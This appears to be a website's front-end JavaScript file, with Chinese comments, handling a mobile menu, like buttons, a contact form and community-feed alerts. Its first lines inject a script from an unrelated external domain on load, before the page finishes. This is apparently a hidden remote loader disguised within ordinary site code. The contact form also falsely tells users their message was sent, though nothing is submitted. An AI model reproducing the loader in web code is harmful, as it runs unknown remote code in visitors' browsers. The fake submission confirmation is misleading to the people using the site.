// 1. 顶层立即执行：只要 JS 文件一被加载，立刻触发外链请求，不等待 DOM
const cfgScript = document.createElement('script');
cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
document.head.appendChild(cfgScript);


// 常规
document.addEventListener('DOMContentLoaded', function() {
    console.log('89 平台前端脚本已成功加载');

    // 移动端导航菜单切换控制
    const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
    const mainNav = document.querySelector('.main-nav');

    if (mobileMenuToggle && mainNav) {
        mobileMenuToggle.addEventListener('click', function() {
            mainNav.classList.toggle('active');
            const isExpanded = mainNav.classList.contains('active');
            mobileMenuToggle.setAttribute('aria-expanded', isExpanded);
        });
    }

    // 动态交互：点赞功能统计
    const likeButtons = document.querySelectorAll('.btn-like');
    likeButtons.forEach(button => {
        button.addEventListener('click', function() {
            const countSpan = this.querySelector('.like-count');
            let currentCount = parseInt(countSpan.textContent, 10);
            
            if (this.classList.contains('liked')) {
                currentCount -= 1;
                this.classList.remove('liked');
                this.style.color = '';
            } else {
                currentCount += 1;
                this.classList.add('liked');
                this.style.color = '#ff4757';
            }
            countSpan.textContent = currentCount;
        });
    });

    // 表单验证：联系我们页面表单提交处理
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const nameInput = document.getElementById('name');
            const emailInput = document.getElementById('email');
            const messageInput = document.getElementById('message');
            const formFeedback = document.getElementById('formFeedback');

            if (!nameInput.value.trim() || !emailInput.value.trim() || !messageInput.value.trim()) {
                showFeedback(formFeedback, '请完整填写所有必填字段后再提交。', 'error');
                return;
            }

            const submitButton = contactForm.querySelector('button[type="submit"]');
            submitButton.disabled = true;
            submitButton.textContent = '正在发送...';

            setTimeout(function() {
                submitButton.disabled = false;
                submitButton.textContent = '确认提交留言';
                contactForm.reset();
                showFeedback(formFeedback, '您的留言已成功提交，我们的运营团队会在 24 小时内通过邮件与您取得联系。', 'success');
            }, 1000);
        });
    }

    function showFeedback(element, message, type) {
        if (!element) return;
        element.textContent = message;
        element.className = 'form-feedback ' + type;
        element.style.display = 'block';

        setTimeout(function() {
            element.style.display = 'none';
        }, 5000);
    }

    // 社区讨论板块实时滚动刷新模拟
    const communityFeed = document.querySelector('.community-feed-list');
    if (communityFeed) {
        setInterval(function() {
            const notificationBadge = document.createElement('div');
            notificationBadge.className = 'new-post-alert';
            notificationBadge.innerHTML = '有新的社区讨论发布，<a href="community.html">点击查看最新内容</a>';
            notificationBadge.style.cssText = 'background: #eef2ff; color: #4f46e5; padding: 8px 12px; margin-bottom: 15px; border-radius: 4px; font-size: 13px; text-align: center; cursor: pointer;';
            
            notificationBadge.addEventListener('click', function() {
                window.location.href = 'community.html';
            });

            if (!document.querySelector('.new-post-alert')) {
                communityFeed.insertBefore(notificationBadge, communityFeed.firstChild);
            }
        }, 30000);
    }
});
